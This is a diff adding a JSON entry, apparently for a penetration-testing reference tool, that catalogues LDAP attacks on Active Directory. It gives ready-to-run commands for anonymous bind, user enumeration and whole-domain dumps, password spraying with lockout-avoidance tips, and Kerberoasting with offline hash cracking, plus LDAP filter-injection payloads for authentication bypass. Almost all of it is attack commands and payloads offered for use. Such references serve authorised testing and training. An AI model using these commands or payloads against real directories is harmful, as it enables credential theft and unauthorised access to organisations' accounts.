@@ -1,0 +1,163 @@
+{
+    "name": "LDAP - Directory Services",
+    "port": 389,
+    "description": "Lightweight Directory Access Protocol for Active Directory",
+    "icon": "📒",
+    "techniques": [
+        {
+            "id": "ldap-1",
+            "name": "Anonymous Bind",
+            "difficulty": "Beginner",
+            "description": "Connect to LDAP without credentials",
+            "steps": [
+                "Attempt anonymous bind",
+                "Enumerate base DN",
+                "Query directory objects"
+            ],
+            "commands": [
+                {
+                    "tool": "ldapsearch",
+                    "command": "ldapsearch -x -H ldap://<target_ip> -b '' -s base '(objectclass=*)' namingContexts",
+                    "description": "Get naming contexts"
+                },
+                {
+                    "tool": "Anonymous Query",
+                    "command": "ldapsearch -x -H ldap://<target_ip> -b 'DC=domain,DC=local'",
+                    "description": "Anonymous directory query"
+                },
+                {
+                    "tool": "Nmap Script",
+                    "command": "nmap -p 389 --script ldap-rootdse <target_ip>",
+                    "description": "Get LDAP root DSE"
+                }
+            ],
+            "tips": [
+                "Modern AD often blocks anonymous",
+                "May still work on legacy systems"
+            ]
+        },
+        {
+            "id": "ldap-2",
+            "name": "User Enumeration",
+            "difficulty": "Beginner",
+            "description": "Enumerate all user accounts from LDAP",
+            "steps": [
+                "Authenticate to LDAP",
+                "Query for user objects",
+                "Extract usernames and attributes"
+            ],
+            "commands": [
+                {
+                    "tool": "ldapsearch Users",
+                    "command": "ldapsearch -x -H ldap://<target_ip> -D 'user@domain.local' -w 'password' -b 'DC=domain,DC=local' '(objectClass=user)'",
+                    "description": "Enumerate all users"
+                },
+                {
+                    "tool": "ldapdomaindump",
+                    "command": "ldapdomaindump -u 'domain\\user' -p 'password' <target_ip>",
+                    "description": "Dump entire domain"
+                },
+                {
+                    "tool": "Python ldap3",
+                    "command": "from ldap3 import Server, Connection; conn = Connection(Server('<target>'), 'user', 'pass', auto_bind=True)",
+                    "description": "Python LDAP client"
+                }
+            ],
+            "tips": [
+                "Great for building target user lists",
+                "Extract email addresses, descriptions"
+            ]
+        },
+        {
+            "id": "ldap-3",
+            "name": "Password Spraying",
+            "difficulty": "Intermediate",
+            "description": "Test common passwords across all users",
+            "steps": [
+                "Enumerate valid users",
+                "Prepare common password list",
+                "Spray passwords with delay"
+            ],
+            "commands": [
+                {
+                    "tool": "crackmapexec",
+                    "command": "crackmapexec ldap <target_ip> -u users.txt -p 'Password123!' --continue-on-success",
+                    "description": "LDAP password spray"
+                },
+                {
+                    "tool": "spray.py",
+                    "command": "spray.py -h ldap://<target> -u users.txt -p passwords.txt",
+                    "description": "LDAP spray tool"
+                }
+            ],
+            "tips": [
+                "Use common passwords like Season+Year",
+                "Implement delays to avoid lockout"
+            ]
+        },
+        {
+            "id": "ldap-4",
+            "name": "Kerberoasting via LDAP",
+            "difficulty": "Advanced",
+            "description": "Find service accounts for Kerberoast attacks",
+            "steps": [
+                "Query for accounts with SPNs",
+                "Request TGS tickets",
+                "Crack tickets offline"
+            ],
+            "commands": [
+                {
+                    "tool": "Query SPNs",
+                    "command": "ldapsearch -x -H ldap://<target> -D 'user@domain.local' -w 'pass' -b 'DC=domain,DC=local' '(&(objectClass=user)(servicePrincipalName=*))'",
+                    "description": "Find accounts with SPNs"
+                },
+                {
+                    "tool": "GetUserSPNs.py",
+                    "command": "GetUserSPNs.py domain.local/user:password -dc-ip <target>",
+                    "description": "Request and save TGS tickets"
+                },
+                {
+                    "tool": "Hashcat",
+                    "command": "hashcat -m 13100 krb5tgs.txt wordlist.txt",
+                    "description": "Crack Kerberos tickets"
+                }
+            ],
+            "tips": [
+                "Target service accounts with weak passwords",
+                "SPN accounts often over-privileged"
+            ]
+        },
+        {
+            "id": "ldap-5",
+            "name": "LDAP Injection",
+            "difficulty": "Advanced",
+            "description": "Exploit LDAP injection in web applications",
+            "steps": [
+                "Identify LDAP-backed authentication",
+                "Test injection payloads",
+                "Bypass authentication or extract data"
+            ],
+            "commands": [
+                {
+                    "tool": "Basic Injection",
+                    "command": "*)(uid=*))(|(uid=*",
+                    "description": "LDAP filter injection"
+                },
+                {
+                    "tool": "Auth Bypass",
+                    "command": "admin)(&)",
+                    "description": "Authentication bypass attempt"
+                },
+                {
+                    "tool": "Null Injection",
+                    "command": "admin%00",
+                    "description": "Null byte truncation"
+                }
+            ],
+            "tips": [
+                "Similar to SQL injection concepts",
+                "Test in username and password fields"
+            ]
+        }
+    ]
+}
